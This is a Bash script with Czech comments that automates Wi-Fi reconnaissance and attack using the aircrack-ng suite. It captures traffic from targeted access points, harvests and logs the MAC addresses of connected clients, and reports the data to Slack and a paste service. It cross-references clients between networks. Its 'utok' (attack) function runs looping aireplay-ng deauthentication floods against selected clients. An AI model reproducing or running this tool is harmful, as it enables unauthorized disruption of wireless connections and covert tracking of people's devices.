#!/bin/bash



function WIFI_START_AIRMON {
    airmon-ng check kill >> /dev/null
    sleep 2
    if [[ -z $2 ]] ; then
        echo "airmon-ng start $1 ${CHANNEL[i+WIFINA]}"
        SLACK2 "airmon-ng start $1 ${CHANNEL[i+WIFINA]}"
        airmon-ng start $1 ${CHANNEL[i+WIFINA]}
    else
        echo "airmon-ng start $1 ${CHANNEL[i-WIFINA]}"
        SLACK2 "airmon-ng start $1 ${CHANNEL[i-WIFINA]}"
        airmon-ng start $1 ${CHANNEL[i-WIFINA]}
    fi    
    sleep 2
}

function WIFI_STOP_AIRMON {
    airmon-ng stop $1mon
    sleep 2
    ifconfig $1 up
    sleep 4
}

function WIFI_SET_MONITOR {
    ip link set $1 down
    iw $1 set monitor control
    ip link set $1 up
}

function WIFI_SET_MANAGED {
    ip link set $1 down
    iw $1 set type managed
    ip link set $1 up
}

function WIFI_AIRODUMP_IN_SCREEN {
    for ((WIFINA=0 ; WIFINA<$WIRELESS_INTERFACES ; WIFINA++)); do 
        screen -d -m airodump-ng -c ${CHANNEL[i+WIFINA]} wlan"$WIFINA" --bssid ${TARGET_MAC[i+WIFINA]} --berlin 36000 --uptime --manufacturer -w /tmp/capture-wlan"$WIFINA" --output-format csv 
        echo "airodump screen .... i=$i .... wifina=$WIFINA .... target_mac=$(( i + WIFINA ))"
    done    
    # pro pripad, ze nebude ani jeden screen airodump , tak preskoc sleep
    [[ ! -z `ps a | grep airodump | grep -v grep` ]] && sleep $AIRODUMP_TIMER
    pkill -f airodump
}

function WIFI_PREHLED_BEACONU {
    WIFI_SET_MANAGED wlan0 &
    WIFI_SET_MANAGED wlan1
    WIFI_REPORT=`iw dev wlan0 scan`
    for i in ${!TARGET_MAC[@]} ; do 
        WIFI_SEEK ${TARGET_MAC[$i]}
        echo "MAC..."${TARGET_MAC[$i]} 
        echo "SSID..."${SSID[i]} 
        echo -e "CHAN..."${CHANNEL[i]}"\n" 
    done
}

function WIFI_AIRODUMP_IN_SCREEN_ALL {
    if [[ "$CYCLETMP" == "10" ]] ; then
        # airodump all channels for 3 minutes
        screen -d -m airodump-ng wlan0 --uptime --manufacturer --wps --berlin 36000 --output-format csv -w /tmp/dumpall
        [[ ! -z `ps a | grep airodump | grep -v grep` ]] && sleep 180
        pkill -f airodump
        cat /tmp/dumpall-01.csv | TEXT_TO_FPASTE_WITH_PASS
        rm -f /tmp/dumpall*   

        CYCLETMP=0
    else
        CYCLETMP=$(( CYCLETMP + 1 ))
    fi    
}

function WIFI_SEEK {
    # .... in : target_mac interface
        echo ".... prepare"
    SSID[i]=`echo "$WIFI_REPORT" | grep -i $1 -A20 | grep -i SSID | awk '{ print $2 }'`
    CHANNEL[i]=`echo "$WIFI_REPORT" | grep -i $1 -A20 | grep "DS Parameter set: channel" | grep -oE  '[^ ]+$'`
}

function WIFI_GRAB_CLIENTS_FROM_CAPTUREFILE {
    [[ -f $file1 ]] && cat $file1  | grep "Station MAC" -A300 | grep -Ev '^\s*($|Station MAC)' | cut -d, -f1
}

function WIFI_VYHODNOCENI_MAC {
    for ((WIFINA=0 ; WIFINA<$WIRELESS_INTERFACES ; WIFINA++)); do 
        file1=/tmp/capture-wlan"$WIFINA"-01.csv
        [[ ! -f $file1 ]] && continue
        
        KLIENTI=`echo -e "$KLIENTI\n$(WIFI_GRAB_CLIENTS_FROM_CAPTUREFILE)" | grep -Ev '(^$)'`
        
        ### MINA - fixne nastaveny limit channel
        [[ $i -eq "4" ]]  && KLIENTIvip=`echo -e "$KLIENTIvip\n$(WIFI_GRAB_CLIENTS_FROM_CAPTUREFILE)" | grep -Ev '(^$)'`
        
        
        # zpracuje data ze scanu a osle do slacku
        SLACKa1=`cat $file1 | awk 'NR==2' | cut -d "," -f1,4-10,14 | sed 's/Authentication/Auth/'`      #BSSID, channel,    Speed, Privacy, Cipher, Auth, Power, # beacons, ESSID
        SLACKa2=`cat $file1 | awk 'NR==3' | cut -d "," -f1,4-10,14`                                     #60:31:97:D7:CC:F9, 10,54, WPA2,    CCMP,   PSK,  -54,   590,       Internet_F8
        SLACK2 "$SLACKa1" "$SLACKa2"

        radky=`cat $file1 | wc -l`
        SLACKb1=`cat $file1 | awk 'NR==5' | cut -d "," -f1,4-6`                                         #Station MAC,       Power, # packets, BSSID
        SLACKb2=`for (( i=6 ; i<=$radky ; i++ )) ; do                                                   #88:BD:45:98:89:14, -1,    10,        60:31:97:D7:CC:F9
            cat $file1 | head -n $i | tail -1 | cut -d"," -f1,4-6
        done`
        SLACK2 "$SLACKb1" "$SLACKb2"
        

        # aktualizovat ever pouzite klienty daneho AP
        
        
        KLIENTx1=`echo "$SLACKb2" | cut -d "," -f1` ; 
        
        # stavajici klienti
        KLIENTx2=`cat $WORKDIR/${TARGET_MAC[i+WIFINA]}_KLIENTI.txt`
        
        echo $KLIENTx1 $KLIENTx2 | tr " " "\n" | sort -u | grep -Ev '^\s$' > $WORKDIR/${TARGET_MAC[i+WIFINA]}_KLIENTI.txt
           
        # zpracovat data o klientech konkretniho AP
        echo `date '+%Y-%m-%d--%H-%M'`"  "$SLACKb2 >> $WORKDIR/${TARGET_MAC[i+WIFINA]}_KLIENTI_LOG.txt
        
        # zpracovat statistiky konkretniho ap ($SLACKa2)
        echo `date '+%Y-%m-%d--%H-%M'`"  "$SLACKa2 >> $WORKDIR/${TARGET_MAC[i+WIFINA]}_AP.txt

        [[ "$file1" != "/" ]] && rm $file1
    done
}

function WIFI_UTOK {
    echo ".... prezbrojeni"
    
    i=$TARGET_MAC_SUM
    
    for ((WIFINA=0 ; WIFINA<$WIRELESS_INTERFACES ; WIFINA++)); do 
        WIFI_SET_MANAGED wlan"$WIFINA"
        WIFI_START_AIRMON wlan$WIFINA utok
    done
    
    La1=`date`

    echo ".... utok"
    for KLIENT in $KLIENTIvip; do 
        echo "utocim na "$KLIENT
        DELKA_UTOKU=`shuf -i 120-210 -n 1`
        echo ".... utok"        
        for ((WIFINA=0 ; WIFINA<$WIRELESS_INTERFACES ; WIFINA++)); do 
            aireplay-ng -0 $DELKA_UTOKU -a ${TARGET_MAC[-1-WIFINA]} -c $KLIENT wlan"$WIFINA"mon &   
    #       screen -d -m aireplay-ng -0 $DELKA_UTOKU -a ${TARGET_MAC[-1-WIFINA]} -c $KLIENT wlan"$WIFINA"mon  
        done
        
        # pockame si na dokonceni aireplay jobu 
        while [[ ! -z `ps a | grep aireplay | grep -v grep` ]] ; do sleep 1 ; done
    done

    La2=`date`

    SLACK2 "$La1" "$La2"
#    [[ "$La1" == "$La2" ]] && [[ "$wifi_attack" == "yes" ]] && [[ ! -z $KLIENTIvip ]] && SlackAlert "fail na $HOSTNAME" "POZOR - DEAUTH NEPROBEHNUL V PORADKU"

    echo ".... odzbrojeni"
    for ((WIFINA=0 ; WIFINA<$WIRELESS_INTERFACES ; WIFINA++)); do 
        WIFI_STOP_AIRMON wlan"$WIFINA" 
    done  

    SLACK2 "dokoncen utok na" "$KLIENTIvip"
    SLACK2 "ver 1.88"
}

function WIFI_NAJDI_SPRATELENE_AP {
    #
    KLIENTSKE_REPORTY=(`ls $WORKDIR/*_KLIENTI.txt`)
    
    for ((KLI1=0 ; KLI1<${#KLIENTSKE_REPORTY[@]} ; KLI1++)) ; do
        # nacteme jednotlive targety jednotlivych AP ... a porovname je grepem :-)
        while IFS='' read -r line || [[ -n "$line" ]]; do
            for ((KLI2=(( KLI1 + 1 )) ; KLI2<${#KLIENTSKE_REPORTY[@]} ; KLI2++)) ; do
                 [[ ! -z `cat ${KLIENTSKE_REPORTY[KLI2]} | grep "$line"` ]] && echo "SHODA $line mezi ${KLIENTSKE_REPORTY[KLI1]} a ${KLIENTSKE_REPORTY[KLI2]}"
            done    
        done < <(cat "${KLIENTSKE_REPORTY[KLI1]}")
    done
}

function WIFI_NAJDI_SPRATELENE_AP_BRIEF {
    KLIENTSKE_REPORTY=(`ls $WORKDIR/*_KLIENTI.txt`)
    echo
    for ((KLI1=0 ; KLI1<${#KLIENTSKE_REPORTY[@]} ; KLI1++)) ; do
        echo ${KLIENTSKE_REPORTY[KLI1]}

        while IFS= read -r line ; do
            echo $line
        done < <(cat "${KLIENTSKE_REPORTY[KLI1]}")
        echo
    done
}

function WIFI_INFO {
    for u in {0..5} ; do
        echo "MAC ... "${TARGET_MAC[u]}
        echo "SSID... "${SSID[u]}
        echo -e "CH .... "${CHANNEL[u]}"\n"
    done
}

function WIFI_ODZBROJENI {
    # prvotni odzbrojeni
    for ((i=0 ; i<$WIRELESS_INTERFACES ; i++)); do WIFI_STOP_AIRMON wlan$i ; WIFI_SET_MANAGED wlan$i ; done
}

function WIFI_DEFAULT_CYCLE {
    while true ; do 
        # reset variables
        KLIENTI=
        KLIENTIvip=
        source $CONFIG_FILE
        
        # jednou za cas si vypsat cely provoz na siti
#       WIFI_AIRODUMP_IN_SCREEN_ALL
        
        # scan na wlan0 - rychla funkce - prehled beaconu - musi byt v MANAGED MODE !!!  Do budoucna jeden wlan interface trvale v airodumpua vyhodnocovat logy
        WIFI_PREHLED_BEACONU

        for i in `seq 0 $WIRELESS_INTERFACES $TARGET_MAC_SUM` ; do 
            # sber klientu pripojenych na BSSID * multi-dump - automaticky prepne do MONITOR MODE !!
            echo ".... airodumpy ve screenu"
            WIFI_AIRODUMP_IN_SCREEN
                
            # vyhodnoceni MAC
            echo ".... vyhodnoceni mac"
            WIFI_VYHODNOCENI_MAC
        done

        # EXCLUDE LIST - xcludnout MAC adresy, ktere nechame byt ze seznamu KLIENTIvip
        echo ""
        ExcludedKlienti=`cat $EXCLUDED_LIST`
        echo "klienti vip "$KLIENTIvip
        echo "excluded list "$ExcludedKlienti
        for temp22 in $ExcludedKlienti ; do
            KLIENTIvip=`echo "$KLIENTIvip" | grep -vi $temp22`
        done
        echo "klienti vip po excludovani "$KLIENTIvip

        # UTOK - pouze pokud jsem v modu utok a je na koho :-)
        echo ""
        [[ "$wifi_attack" == "yes" ]]  && [[ ! -z $KLIENTIvip ]] && WIFI_UTOK

        # doplnit KLIENTI do KLIENTI_LIST
        KLIENTI2=`cat $KLIENTI_LIST` ; echo $KLIENTI $KLIENTI2 | tr " " "\n" | sort -u > $KLIENTI_LIST
    done
}

function WIFI_DEFAULT_CONFIG {
    [[ ! -f $CONFIG_FILE ]] && echo "wifi_attack=no" > $CONFIG_FILE
    source $CONFIG_FILE
}




